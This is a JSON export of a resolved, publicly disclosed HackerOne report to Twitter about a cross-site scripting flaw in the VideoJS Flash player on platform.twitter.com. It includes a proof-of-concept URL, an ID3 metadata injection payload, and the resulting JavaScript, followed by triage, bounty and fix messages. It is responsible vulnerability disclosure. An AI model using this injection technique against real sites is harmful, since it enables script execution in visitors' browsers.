{"id":29360,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTM2MA==","url":"https://hackerone.com/reports/29360","title":"XSS platform.twitter.com | video-js metadata","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-09-29T09:49:48.027Z","submitted_at":"2014-09-29T09:49:48.027Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"batram","url":"/batram","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/745/fe0be3754f6ee49fc3bf161d20641ce917cde595_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-11-17T14:30:53.543Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2014-10-06T21:13:51.491Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf\r\n\r\nVideoJS does not escape metadata passed to JavaScript via ExternalInterface. \r\nSince VideoJS does not load a required policy file to read metadata from mp3s loaded from an external server via http we need to use rtmp. Also other metadata send from the server (like the servername) can be used to gain JavaScript-Execution.\r\n\r\n__PoC:__\r\nhttps://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log\u0026autoplay=true\u0026rtmpStream=mp3:haha\u0026rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/\r\n\r\n_Example File:_\r\nhttp://batr.am/haha.mp3\r\n\r\nID3:\r\n\r\n    Title: \\\"})})))}finally{confirm(/moin/)}//\r\n\r\n\r\nResulting JS:\r\n\r\n    try { __flash__toXML(console.log(\"plugin\",\"loadedmetadata\",({audiochannels:2,tags:({TIT2:\"\\\\\"})})))}finally{confirm(/moin/)}//\"}),audiosamplerate:44100,audiocodecid:\".mp3\",bandwidth:368,endTimestamp:1.881,Server:\"C++ RTMP Media Server (www.rtmpd.com)\",totalFramesCount:73,duration:1.881,fileSize:47104,videoFramesCount:0,startTimestamp:0,audioFramesCount:0,stereo:true}))) ; } catch (e) { \"\u003cundefined/\u003e\"; }\r\n\r\nTested with:\r\nC++ RTMP Media Server (www.rtmpd.com)\r\n\r\nWin 8.1 | Google Chrome Version 39.0.2166.2 dev-m (64-bit) | Flash plugin 15.0.0.152\r\nWin 8.1 | Mozilla Firefox Version 32.0.3 | Flash plugin 15.0.0.152","vulnerability_information_html":"\u003cp\u003e\u003ca title=\"https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf\" href=\"/redirect?url=https%3A%2F%2Fplatform.twitter.com%2Fvideo%2Fvideo-js.1e43b81a2f30220a16fd493aaf072451.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eVideoJS does not escape metadata passed to JavaScript via ExternalInterface. \u003cbr\u003e\nSince VideoJS does not load a required policy file to read metadata from mp3s loaded from an external server via http we need to use rtmp. Also other metadata send from the server (like the servername) can be used to gain JavaScript-Execution.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC:\u003c/strong\u003e\u003cbr\u003e\n\u003ca title=\"https://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log\u0026amp;autoplay=true\u0026amp;rtmpStream=mp3:haha\u0026amp;rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/\" href=\"/redirect?url=https%3A%2F%2Fplatform.twitter.com%2Fvideo%2Fvideo-js.1e43b81a2f30220a16fd493aaf072451.swf%3FeventProxyFunction%3Dconsole.log%26autoplay%3Dtrue%26rtmpStream%3Dmp3%3Ahaha%26rtmpConnection%3Drtmp%3A%2F%2Fnot-a-real-example-rtmp-server.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://platform.twitter.com/video/video-js.1e43b81a2f30220a16fd493aaf072451.swf?eventProxyFunction=console.log\u0026amp;autoplay=true\u0026amp;rtmpStream=mp3:haha\u0026amp;rtmpConnection=rtmp://not-a-real-example-rtmp-server.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003eExample File:\u003c/u\u003e\u003cbr\u003e\n\u003ca title=\"http://batr.am/haha.mp3\" href=\"/redirect?url=http%3A%2F%2Fbatr.am%2Fhaha.mp3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://batr.am/haha.mp3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eID3:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eTitle: \\\u0026quot;})})))}finally{confirm(/moin/)}//\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResulting JS:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etry { __flash__toXML(console.log(\u0026quot;plugin\u0026quot;,\u0026quot;loadedmetadata\u0026quot;,({audiochannels:2,tags:({TIT2:\u0026quot;\\\\\u0026quot;})})))}finally{confirm(/moin/)}//\u0026quot;}),audiosamplerate:44100,audiocodecid:\u0026quot;.mp3\u0026quot;,bandwidth:368,endTimestamp:1.881,Server:\u0026quot;C++ RTMP Media Server (www.rtmpd.com)\u0026quot;,totalFramesCount:73,duration:1.881,fileSize:47104,videoFramesCount:0,startTimestamp:0,audioFramesCount:0,stereo:true}))) ; } catch (e) { \u0026quot;\u0026lt;undefined/\u0026gt;\u0026quot;; }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTested with:\u003cbr\u003e\nC++ RTMP Media Server (\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.rtmpd.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.rtmpd.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eWin 8.1 | Google Chrome Version 39.0.2166.2 dev-m (64-bit) | Flash plugin 15.0.0.152\u003cbr\u003e\nWin 8.1 | Mozilla Firefox Version 32.0.3 | Flash plugin 15.0.0.152\u003c/p\u003e\n","bounty_amount":"1120.0","formatted_bounty":"$1,120","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-11-05T22:13:51.694Z","allow_singular_disclosure_after":-193993946.14502612,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":133731,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-09-29T19:36:36.501Z","updated_at":"2014-09-29T19:36:36.501Z","actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":136054,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","markdown_message":"\u003cp\u003eThanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-04T03:42:06.233Z","updated_at":"2014-10-04T03:42:06.233Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"1120.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"batram","url":"/batram"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":137273,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-06T20:14:55.187Z","updated_at":"2014-10-06T20:14:55.187Z","actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"batram","url":"/batram"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":137314,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Since the file is gone this specific problem is fixed.\nIn the new file https://platform.twitter.com/video/video-js.38c22e19110d73af234bce55423cbaab.swf the parameters for rtmp don't seem to be read anymore. So I would say that solves the problem as well.\n\nPlease correct me if I'm wrong in my assumption and my decompiler fooled me once again.","markdown_message":"\u003cp\u003eSince the file is gone this specific problem is fixed.\u003cbr\u003e\nIn the new file \u003ca title=\"https://platform.twitter.com/video/video-js.38c22e19110d73af234bce55423cbaab.swf\" href=\"/redirect?url=https%3A%2F%2Fplatform.twitter.com%2Fvideo%2Fvideo-js.38c22e19110d73af234bce55423cbaab.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://platform.twitter.com/video/video-js.38c22e19110d73af234bce55423cbaab.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the parameters for rtmp don\u0026#39;t seem to be read anymore. So I would say that solves the problem as well.\u003c/p\u003e\n\n\u003cp\u003ePlease correct me if I\u0026#39;m wrong in my assumption and my decompiler fooled me once again.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-06T20:54:02.525Z","updated_at":"2014-10-06T20:54:02.525Z","actor":{"username":"batram","cleared":false,"url":"/batram","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/745/fe0be3754f6ee49fc3bf161d20641ce917cde595_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":137343,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We are requesting public disclosure to encourage other white hats to submit quality reports like yours. Thanks again.","markdown_message":"\u003cp\u003eWe are requesting public disclosure to encourage other white hats to submit quality reports like yours. Thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-06T21:13:51.507Z","updated_at":"2014-10-06T21:13:51.507Z","first_to_agree":true,"actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":139556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I reported this to VideoJS via mail  a while ago (Fri, Aug 2, 2013), but never heard back.\n\nThe version (4.5.0) they distribute for download (http://www.videojs.com/) and have in their github-repo (https://github.com/videojs/video-js-swf) is still vulnerable to this bug. \n\nI will now follow up with them and try to get this fixed before public disclosure.","markdown_message":"\u003cp\u003eI reported this to VideoJS via mail  a while ago (Fri, Aug 2, 2013), but never heard back.\u003c/p\u003e\n\n\u003cp\u003eThe version (4.5.0) they distribute for download (\u003ca title=\"http://www.videojs.com/\" href=\"/redirect?url=http%3A%2F%2Fwww.videojs.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.videojs.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and have in their github-repo (\u003ca title=\"https://github.com/videojs/video-js-swf\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvideojs%2Fvideo-js-swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/videojs/video-js-swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) is still vulnerable to this bug. \u003c/p\u003e\n\n\u003cp\u003eI will now follow up with them and try to get this fixed before public disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-09T11:44:25.907Z","updated_at":"2014-10-09T11:44:25.907Z","actor":{"username":"batram","cleared":false,"url":"/batram","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/745/fe0be3754f6ee49fc3bf161d20641ce917cde595_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":139785,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Makes sense to me.  Thanks again.","markdown_message":"\u003cp\u003eMakes sense to me.  Thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-09T17:18:01.623Z","updated_at":"2014-10-09T17:18:01.623Z","actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":161992,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-17T14:30:53.552Z","updated_at":"2014-11-17T14:30:53.552Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}